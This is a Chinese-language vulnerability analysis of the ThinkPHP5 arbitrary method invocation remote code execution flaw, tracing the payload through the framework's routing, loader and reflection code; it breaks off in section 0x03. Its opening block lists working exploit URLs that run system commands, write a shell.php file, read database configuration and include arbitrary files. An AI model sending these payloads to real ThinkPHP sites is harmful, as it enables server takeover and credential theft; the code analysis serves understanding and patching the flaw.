# ThinkPHP5任意方法调用RCE

>   参考链接：[Mochazz/ThinkPHP-Vuln/]([https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB7.md](https://github.com/Mochazz/ThinkPHP-Vuln/blob/master/ThinkPHP5/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C9.md))
>
>   影响版本：**5.0.7<=ThinkPHP5<=5.0.22 、5.1.0<=ThinkPHP<=5.1.30**
>
>   测试环境：PHP7.3.4、Mysql5.7.26、TP5.0.18
>
>   **5.1.x** ：
>
>   ```
>   ?s=index/\think\Request/input&filter[]=system&data=pwd
>   ?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>
>   ?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
>   ?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
>   ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
>   ```
>
>   **5.0.x** ：
>
>   ```
>   ?s=index/think\config/get&name=database.username # 获取配置信息
>   ?s=index/\think\Lang/load&file=../../test.jpg    # 包含任意文件
>   ?s=index/\think\Config/load&file=../../t.php     # 包含任意.php文件
>   ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
>   ```

本文以`?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami`

为例。

相信很多人在不懂原理的情况下，看这一串payload是感觉很nb的一个paylaod（因为它长，需要的参数多），像我本人之前就纳闷这payload中为啥还会有反斜杠，s参数名是啥？invokefunction是啥？这个think\app是个啥东西呀为啥为啥。可是当时只看得懂system(whoami)😂。接下来就从代码中找到这些答案。

==只想看结果请直接跳到：==

## 0x00 从?s=是个啥开始

在application\config.php#78行，有一个var_pathinfo键的值默认就是s，而该项的注释是`PATHINFO变量名 用于兼容模式`。那么什么是PATHINFO？什么是兼容模式？

在源码中遇到不知道的定义，大可以全局搜索它在哪里定义，哪里用到了它：

![image-20220419160647401](ThinkPHP5漏洞分析之代码执行(七).assets/image-20220419160647401.png)

来到thinkphp\library\think\Request.php#pathinfo()来阅读var_pathinfo的使用。

![image-20220419161105887](ThinkPHP5漏洞分析之代码执行(七).assets/image-20220419161105887.png)

可以看到在390行用Config::get获取了var_pathinfo的值，也就是s，然后就变成了``$_GET[s]`，获取到值赋值给`$_SERVER['PATH_INFO']`，然后下面407行去除了最左边的正斜杠。那么现在就明白了。s就是用来获取payload中的`index/\think\app/invokefunction`这部分的，它也叫做兼容模式参数，而它的值在tp里面就作为pathinfo。pathinfo后来又会怎么处理呢？继续跟着程序执行流程

在thinkphp\library\think\Route.php#check()

![image-20220419162000264](ThinkPHP5漏洞分析之代码执行(七).assets/image-20220419162000264.png)

其中，$url实际上传入的就是刚才的pathinfo的值。注意到839行把所有的`/`都替换为了`|`。那么现在就是

`index|\think\app|invokefunction`这个样子。但是因为没有定义好的路由规则，最后还是return了false。在thinkphp\library\think\App.php#642:

![image-20220419162556069](ThinkPHP5漏洞分析之代码执行(七).assets/image-20220419162556069.png)

可以看到，如果没有定义好路由规则，也就是刚才的return了false，并且还有强制路由的话就会抛出错误。但是这个漏洞利用条件之一就是不开启强制路由~。

那么再往下走，就会到thinkphp\library\think\Route.php#parseUrl来解析那个`pathinfo`。我想这应该就是所谓的兼容模式了。

## 0x01 模型/控制器/方法的处理



在parseUrl方法中也会把正斜杠替换为|来处理`index/\think\app/invokefunction`（为了方便下面以url替换这串）

但是与之前的check方法不同的是，它紧接着调用了parseUrlPath()方法。

![image-20220419163335378](ThinkPHP5漏洞分析之代码执行(七).assets/image-20220419163335378.png)

在parseUrlPath()方法中，用`$path = explode('/', $url);`来把这个url给处理为了一个数组。：

![image-20220419163613050](ThinkPHP5漏洞分析之代码执行(七).assets/image-20220419163613050.png)

这样实际上就是分成了模型、控制器、方法了。最终逐个获取的位置是parseUrl方法的：

## ![image-20220419163858205](ThinkPHP5漏洞分析之代码执行(七).assets/image-20220419163858205.png)0x02 漏洞原因

当程序执行到thinkphp\library\think\App.php#exec()，会进入到module分支，来到module方法，在：

![image-20220419164634285](ThinkPHP5漏洞分析之代码执行(七).assets/image-20220419164634285.png)

这里的$result数组实际上就是刚才parseUrl返回的那个“$path数组”，

![image-20220419163613050](ThinkPHP5漏洞分析之代码执行(七).assets/image-20220419163613050.png)

1=>控制器，2=>操作名（也叫做方法名）。在这里获取了之后，程序没有再对控制器、方法名过滤导致了任意控制器下任意方法的调用。（但实际上并不是很任意。。）

紧接着就会使用加载器

```php
$instance = Loader::controller(
                $controller,
                $config['url_controller_layer'],
                $config['controller_suffix'],
                $config['empty_controller']
            );
```

加载\think\app了，在thinkphp\library\think\Loader.php#controller

![image-20220419165203092](ThinkPHP5漏洞分析之代码执行(七).assets/image-20220419165203092.png)

然后在invokeClass方法中：

![image-20220419165256848](ThinkPHP5漏洞分析之代码执行(七).assets/image-20220419165256848.png)

使用反射来获取了think\App的一个指针？句柄？反正$reflect现在已经代表这个类了。 。。然后用：

![image-20220419165635171](ThinkPHP5漏洞分析之代码执行(七).assets/image-20220419165635171.png)

来实例化。，返回到了$instance变量中，这时控制器这块已经基本上处理完了，think\App实际上就是thinkphp\library\think\App.php这个php文件里的App类（在MVC架构中，某些类也是可以叫做控制器），think是一个命名空间。意思就是think命名空间下的都是thinkphp的核心代码。命名空间的概念百度一下就知道了。

接下来就是获取方法，调用反射执行类的方法。App类里的invokefunction方法如下：

```php
    /**
     * 执行函数或者闭包方法 支持参数调用
     * @access public
     * @param string|array|\Closure $function 函数或者闭包
     * @param array                 $vars     变量
     * @return mixed
     */
    public static function invokeFunction($function, $vars = [])
    {
        $reflect = new \ReflectionFunction($function);
        $args    = self::bindParams($reflect, $vars);
        // 记录执行信息
        self::$debug && Log::record('[ RUN ] ' . $reflect->__toString(), 'info');

        return $reflect->invokeArgs($args);
    }
```

最后return的时候调用了invokeArgs，在手册中解释如下：

![image-20220419171539267](ThinkPHP5漏洞分析之代码执行(七).assets/image-20220419171539267.png)

很明确它是能调用带参函数的。

总体流程如下：使用反射执行了App里的invokeFunction，并给其传入了参数1：`function=call_user_func_array`，参数2：`vars[]=system&vars[1][]=whoami`。

它会执行`call_user_func_array('system', ['whoami'])`，也就是system('whoami')。执行了命令。

## 0x03 参数的获取？

使用的是bindParams方法获取的参数，参数名必须还得是这特定值，为啥呢？

因为bindParams方法中会用getParameters（ReflectionFunctionAbstract::getParameters）获取反射对象的每一个参数，返回参数列表。
